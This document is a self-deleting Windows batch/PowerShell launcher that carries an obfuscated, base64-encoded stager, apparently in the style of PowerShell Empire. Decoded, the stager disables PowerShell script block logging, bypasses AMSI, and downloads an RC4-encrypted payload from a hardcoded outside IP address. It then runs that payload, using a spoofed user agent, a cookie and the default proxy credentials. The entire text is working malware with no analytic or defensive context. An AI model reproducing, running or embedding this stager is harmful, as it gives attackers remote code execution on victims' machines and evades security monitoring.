# 2>NUL & @CLS & PUSHD "%~dp0" & "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -nol -nop -ep bypass "[IO.File]::ReadAllText('%~f0')|iex" & DEL "%~f0" & POPD /B
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAFIAUwBJAE8ATgBUAEEAYgBMAGUALgBQAFMAVgBlAFIAcwBpAE8AbgAuAE0AQQBqAE8AUgAgAC0AZwBFACAAMwApAHsAJABiAGUAMgBlADMAPQBbAFIARQBGAF0ALgBBAFMAcwBlAG0AQgBMAHkALgBHAGUAVABUAHkAcABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAEQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQAYgBFADIAZQAzACkAewAkADgARgBBADEAQgA9ACQAYgBlADIAZQAzAC4ARwBFAHQAVgBBAEwAVQBlACgAJABOAFUATABsACkAOwBJAEYAKAAkADgAZgBBADEAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADgAZgBhADEAYgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA4AEYAQQAxAEIAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAEwATABlAEMAVABJAG8ATgBzAC4ARwBlAE4AZQBSAGkAQwAuAEQASQBDAFQAaQBPAE4AYQByAHkAWwBTAFQAcgBJAG4ARwAsAFMAWQBzAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAGUAdwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAOABGAEEAMQBiAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBMAH0ARQBMAHMAZQB7AFsAUwBjAHIAaQBQAHQAQgBMAG8AQwBLAF0ALgAiAEcARQB0AEYAaQBFAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEATABVAGUAKAAkAG4AdQBMAGwALAAoAE4AZQBXAC0ATwBiAGoARQBDAFQAIABDAG8ATABMAEUAYwBUAGkATwBuAFMALgBHAGUAbgBlAHIASQBjAC4ASABBAHMAaABTAEUAdABbAHMAdABSAGkAbgBnAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAEUAbQBiAGwAWQAuAEcAZQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBpAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbAB1AGUAKAAkAE4AVQBsAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBzAHQAZQBtAC4ATgBFAFQALgBTAEUAUgB2AEkAYwBlAFAAbwBpAG4AdABNAGEAbgBhAGcAZQBSAF0AOgA6AEUAWABQAEUAYwB0ADEAMAAwAEMATwBOAHQASQBuAFUARQA9ADAAOwAkAEUANgBDAEMANQA9AE4AZQBXAC0ATwBCAEoARQBjAHQAIABTAFkAUwB0AGUAbQAuAE4ARQBUAC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAE4AQwBvAEQAaQBuAGcAXQA6ADoAVQBOAEkAYwBvAEQAZQAuAEcAZQBUAFMAVAByAGkATgBHACgAWwBDAE8ATgB2AGUAUgBUAF0AOgA6AEYAUgBPAE0AQgBBAFMAZQA2ADQAUwB0AHIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAUQBBAE0AQQBBAHUAQQBEAEUAQQBNAFEAQQB6AEEAQwA0AEEATQBRAEEANQBBAEQAVQBBAEwAZwBBAHgAQQBEAGMAQQBNAFEAQQA2AEEARABrAEEATwBRAEEANQBBAEQAYwBBACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGUANgBjAGMANQAuAEgARQBhAEQAZQByAFMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAEUANgBjAEMANQAuAFAAcgBPAHgAWQA9AFsAUwB5AHMAVABFAG0ALgBOAEUAdAAuAFcARQBCAFIAZQBRAHUAZQBzAHQAXQA6ADoARABlAGYAQQB1AEwAdABXAGUAQgBQAFIAbwB4AHkAOwAkAGUANgBjAEMANQAuAFAAUgBvAFgAWQAuAEMAcgBFAGQARQBOAFQAaQBBAGwAcwAgAD0AIABbAFMAWQBTAFQARQBNAC4ATgBFAFQALgBDAHIAZQBEAGUAbgB0AEkAYQBsAEMAQQBDAGgARQBdADoAOgBEAGUARgBBAFUAbAB0AE4AZQBUAHcATwBSAEsAQwByAGUAZABFAG4AdABpAEEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGUANgBjAGMANQAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABFAE0ALgBUAEUAeABUAC4ARQBuAGMATwBkAEkATgBHAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAEUAcwAoACcASgA1ACUAOwBDAEwAMQAoAF0AWABLAHgAQgAmADYAfQBGAGMAbwB5ADQAPwBhADAAZQBJAHQAcQAhAFQAWwBoACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAZQA2AEMAYwA1AC4ASABFAGEAZABFAHIAcwAuAEEARABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBqAHcAdABaAGkAQgBpAGYAcQBCAHIAQwBEAEMAPQBoAHcAcgBhAGEAZQBrAEYAWABHAGwALwB5AEUAWgBiAG8AeQBjAHIANABTAGwAUgBBAFcAbwA9ACIAKQA7ACQAZABBAFQAYQA9ACQARQA2AEMAYwA1AC4ARABPAFcATgBMAG8AYQBkAEQAQQB0AGEAKAAkAFMARQByACsAJABUACkAOwAkAEkAVgA9ACQARABBAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAYQA9ACQARABhAHQAQQBbADQALgAuACQAZABhAFQAQQAuAGwAZQBOAGcAdABoAF0AOwAtAEoAbwBJAG4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
